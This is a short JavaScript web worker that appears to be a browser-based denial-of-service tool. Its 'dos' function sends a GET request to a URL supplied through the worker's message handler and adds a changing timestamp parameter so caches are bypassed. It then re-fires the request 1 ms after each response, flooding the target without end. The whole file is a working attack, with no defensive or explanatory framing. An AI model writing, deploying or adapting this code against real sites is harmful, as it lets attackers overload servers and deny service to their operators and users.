function make_url(base){
    var date = new Date();
    if(base.indexOf("?")==-1){
        return base+"?v="+date.getTime();
    } else {
        return base+"&v="+date.getTime();
    }
}

function dos(base) {
  var fullUrl = make_url(base);

  function infoReceived()
  {
    httpRequest = null;
    setTimeout('dos(\''+base+'\');',1);
  }

  var httpRequest = new XMLHttpRequest();
  httpRequest.open("GET", fullUrl, true);
  httpRequest.onreadystatechange = infoReceived;
  httpRequest.send(null);
}

self.onmessage = function(e) {
	dos(e.data);
}
